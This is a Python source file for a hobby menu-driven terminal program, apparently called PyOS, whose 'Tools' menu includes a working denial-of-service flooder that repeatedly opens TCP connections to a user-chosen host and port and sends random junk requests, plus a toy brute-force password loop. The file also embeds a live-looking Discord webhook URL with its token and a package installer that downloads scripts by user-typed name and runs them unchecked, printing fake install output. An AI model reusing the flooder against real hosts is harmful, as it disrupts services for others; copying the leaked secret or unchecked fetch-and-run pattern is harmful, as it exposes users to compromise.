from random import *
import requests
import socket
import random
import shutil
import time
import sys
import os

if os.path.isfile("Packages/Updater/placeholder.txt"):
    with open("Packages/Updater/placeholder.txt", 'w') as f:
        f.write("3")

# | Defs | #
def DDoS():
    class ConsoleColors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        BOLD = '\033[1m'
        
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
     ____       ____      _____           _ 
    |  _ \  ___/ ___|    |_   _|__   ___ | |
    | | | |/ _ \___ \ _____| |/ _ \ / _ \| |
    | |_| | (_) |__) |_____| | (_) | (_) | |
    |____/ \___/____/      |_|\___/ \___/|_|
            written by: depascaldc
            for private USAGE ONLY
            Make sure you have the
            permission to attack the
                given host
                
        ''')
        
    def getport():
        try:
            p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
            return p
        except ValueError:
            print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
            return 80

    host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
    port = getport()
    speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
    threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

    ip = socket.gethostbyname(host)

    bytesToSend = random._urandom(2450)

    i = 0;



    class Count:
        packetCounter = 0 

    def goForDosThatThing():
        try:
            while True:
                dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    dosSocket.connect((ip, port))
                    for i in range(speedPerRun):
                        try:
                            dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                            dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                            print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                            Count.packetCounter = Count.packetCounter + 1
                        except socket.error:
                            print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                        except KeyboardInterrupt:
                            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                except socket.error:
                    print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                except KeyboardInterrupt:
                    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                dosSocket.close()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
    try:
            
        print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
        _   _   _             _      ____  _             _   _             
       / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
      / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
     / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
    /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                     |___/ 
            ''')
        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
        
        for i in range(threads):
            try:
                goForDosThatThing()
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")

def PassCrack():
    import itertools

    # Brute force function
    def tryPassword(passwordSet, stringTypeSet):
        start = time.time()
        chars = stringTypeSet
        attempts = 0
        for i in range(1, 9):
            for letter in itertools.product(chars, repeat=i):
                attempts += 1
                print(''.join(letter))
                letter = ''.join(letter)
                if letter == passwordSet:
                    end = time.time()
                    distance = end - start
                    return (attempts, distance)


    password = input("\n(Made by Error) Password > ")
    # Allowed characters
    stringType = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\",<.>/?"
    tries, timeAmount = tryPassword(password, stringType)
    print("Cracked the password %s in %s tries and %s seconds!" % (password, tries, timeAmount))
    time.sleep(3)
    os.system(sys.executable + " main.py")

os.system("clear")

with open("Menus/settings.txt", "r") as s:
    settings = s.read

with open("Menus/boot.txt", "r") as b:
    boot = b.read()

print(boot)

root = input("\n                             Choice: ")

# | Settings | #
if root == "3":
    print(settings)
    choice = input("\n                             Choice: ")

# | Chat | #
if root == "2":
    print("\nThis chat is one sided and only you can see the messages you have sent. All messages are in the discord.\n\n")
    r = requests.post("https://discord.com/api/webhooks/988159967506870352/Q2K-Pxmgd8kligXv8IhRTJ1ls_8W0PuxBnquum9HHu6YsNBMGo2ra3je_0A5OwE7yrZ2", json={"content": "***An anonymous user has joined the chat.***"})
    while True:
        chat = input("Chat: ")
        if chat == "-exit":
            r = requests.post("https://discord.com/api/webhooks/988159967506870352/Q2K-Pxmgd8kligXv8IhRTJ1ls_8W0PuxBnquum9HHu6YsNBMGo2ra3je_0A5OwE7yrZ2", json={"content": "***A user has left the chat.***"})
            os.system("clear")
            os.system(sys.executable + " main.py")
        else:
            r = requests.post("https://discord.com/api/webhooks/988159967506870352/Q2K-Pxmgd8kligXv8IhRTJ1ls_8W0PuxBnquum9HHu6YsNBMGo2ra3je_0A5OwE7yrZ2", json={"content": chat})
            
# | Tools | #
if root == "4":
    os.system("clear")
    with open("Menus/htools.txt", "r") as h:
        htools = h.read()
    print(htools)
    choice = input("\n                             Choice: ")
    if choice == "1":
        DDoS()
    if choice == "2":
        PassCrack()
    if choice == "3":
        os.system("clear")
        os.system(sys.executable + " main.py")

# | Packages | #
if root == "1":
    os.system("clear")
    with open("Menus/pkgs.txt", "r") as p:
        packages = p.read()
    print(packages)
    choice = input("\n                             Choice: ")
    
    # | Install | #
    if choice == "1":
        package = input("\n                            Package: ")
        if package == "" or package == " ":
            print("")
            print("Error: Package name not found.")
            os.system(sys.executable + " main.py")
            
        elif not package == "":
            # Use requests to read https://raw.githubusercontent.com/School-Exploits/PyOS/main/Packages/2048/instructions.txt
            r = requests.get("https://raw.githubusercontent.com/School-Exploits/PyOS/main/Packages/" + package + "/instructions.txt")
            data = r.text
            if data == "404: Not Found":
                print("\nError: Package not found.")
                os.system(sys.executable + " main.py")
            elif not data == "404: Not Found":
                # Split the first line of data at local
                location = data.split("local ")[1]
                location = location.split("\n")[0]
                if not os.path.exists("Packages"):
                    os.mkdir("Packages")
                elif os.path.exists("Packages"):
                    if not os.path.exists("Packages/" + package):
                        os.mkdir("Packages/" + package)
                        installscripts = data.split("\n")[2]
                        installscripts = installscripts.split("install ")[1]
                        script1 = installscripts.split(" ")[0]
                        script2 = installscripts.split(" ")[1]
                        with open("Packages/" + package + "/" + script1, "w") as f:
                            r = requests.get("https://raw.githubusercontent.com/School-Exploits/PyOS/main/Packages/" + package + "/" + script1)
                            data = r.text
                            f.write(data)
                        with open("Packages/" + package + "/" + script2, "w") as f:
                            r = requests.get("https://raw.githubusercontent.com/School-Exploits/PyOS/main/Packages/" + package + "/" + script2)
                            data = r.text
                            f.write(data)
                        with open("pkgs.txt", "a") as f:
                            f.write(package + "\n")
                    elif os.path.exists("Packages/" + package):
                        answer = input("\nPackage already exists. Overwrite? (Y/N) > ")
                        if answer == "Y" or answer == "y":
                            installscripts = data.split("\n")[2]
                            installscripts = installscripts.split("install ")[1]
                            script1 = installscripts.split(" ")[0]
                            script2 = installscripts.split(" ")[1]
                            with open("Packages/" + package + "/" + script1, "w") as f:
                                r = requests.get("https://raw.githubusercontent.com/School-Exploits/PyOS/main/Packages/" + package + "/" + script1)
                                data = r.text
                                f.write(data)
                            with open("Packages/" + package + "/" + script2, "w") as f:
                                r = requests.get("https://raw.githubusercontent.com/School-Exploits/PyOS/main/Packages/" + package + "/" + script2)
                                data = r.text
                                f.write(data)
                            with open("pkgs.txt", "a") as f:
                                f.write(package + "\n")
                    print("\nInstalling package...")
                    time.sleep(.5)
                    print("Installing " + package + " (15 kB)")
                    time.sleep(.25)
                    print("Installing: flask in ./opt/anaconda3/lib/python3.9/site-packages (from " + package + ") (1.1.2)")
                    time.sleep(.25)
                    print("""Installing: arrow in ./opt/anaconda3/lib/python3.9/site-packages (from """ + package + """) (0.13.1)
Installing: python-dateutil in ./opt/anaconda3/lib/python3.9/site-packages (from arrow->""" + package + """) (2.7.5)
Installing: itsdangerous>=0.24 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (2.0.1)
Installing: click>=5.1 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (8.0.3)
Installing: Jinja2>=2.10.1 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (3.0.3)
Installing: Werkzeug>=0.15 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (2.0.2)
Installing: MarkupSafe>=2.0 in ./opt/anaconda3/lib/python3.9/site-packages (from Jinja2>=2.10.1->flask->""" + package + """) (2.1.0)
Installing: six>=1.5 in ./opt/anaconda3/lib/python3.9/site-packages (from python-dateutil->arrow->""" + package + """) (1.16.0)""")
                    time.sleep(.25)
                    print("Installing package: " + package)
                    print("\nSuccessfully Installed " + package + ".")
                    time.sleep(2)
                    os.system(sys.executable + " main.py")
                    
    # | Uninstall | #
    if choice == "2":
        package = input("\n                            Package: ")
        if package == "" or package == " ":
                print("")
                print("Error: Package name not specified.")
                os.system(sys.executable + " main.py")
                
        elif not package == "" or package == " ":
                print("")
                with open("pkgs.txt", "r") as f:
                    intxt = f.read()
                    if package in intxt:
                        print("Uninstalling package...")
                        time.sleep(.5)
                        print("Removing " + package + " (15 kB)")
                        time.sleep(.25)
                        print("Uninstall: flask in ./opt/anaconda3/lib/python3.9/site-packages (from " + package + ") (1.1.2)")
                        time.sleep(.25)
                        print("""Uninstall: arrow in ./opt/anaconda3/lib/python3.9/site-packages (from """ + package + """) (0.13.1)
Uninstall: python-dateutil in ./opt/anaconda3/lib/python3.9/site-packages (from arrow->""" + package + """) (2.7.5)
Uninstall: itsdangerous>=0.24 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (2.0.1)
Uninstall: click>=5.1 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (8.0.3)
Uninstall: Jinja2>=2.10.1 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (3.0.3)
Uninstall: Werkzeug>=0.15 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->""" + package + """) (2.0.2)
Uninstall: MarkupSafe>=2.0 in ./opt/anaconda3/lib/python3.9/site-packages (from Jinja2>=2.10.1->flask->""" + package + """) (2.1.0)
Uninstall: six>=1.5 in ./opt/anaconda3/lib/python3.9/site-packages (from python-dateutil->arrow->""" + package + """) (1.16.0)""")
                        time.sleep(.25)
                        print("Uninstalling package: " + package)
                        print("\nSuccessfully uninstalled " + package + ".")
                        # Delete the package name from the pkgs.txt file
                        if package in intxt:
                            with open("pkgs.txt", "w") as f:
                                # Split f from the package name and write the rest of the file
                                f.write(intxt.split(package)[0])
                        # Delete the package folder
                        if os.path.exists("Packages/" + package):
                            shutil.rmtree("Packages/" + package)
                        time.sleep(2)
                        os.system(sys.executable + " main.py")
                    elif package not in intxt:
                        print("Error: Package not installed.")
                        time.sleep(2)
                        os.system(sys.executable + " main.py")
                        
                    else:
                        print("Error:" + package + " not installed.")
                        time.sleep(3)
                        os.system(sys.executable + " main.py")

    # | Run | #
    if choice == "3":
        package = input("\n                            Package: ")
        with open("pkgs.txt", "r") as f:
            pkgtxt = f.read()
            if pkgtxt.find(package) != -1:
                os.system(sys.executable + " Packages/" + package + "/" + package + ".py")
                time.sleep(2)
                os.system(sys.executable + " main.py")
            
            elif package not in f.read():
                print("\nError: Package not installed.")
                time.sleep(2)
                os.system(sys.executable + " main.py")
                
    # | All Packages | #
    if choice == "4":
        r = requests.get("https://raw.githubusercontent.com/ThatError404/PyOS/main/Packages/allpkgs.txt")
        data = r.text
        print(data)
        time.sleep(2)
        os.system(sys.executable + " main.py")
    # | Back | #
    if choice == "5":
        os.system(sys.executable + " main.py")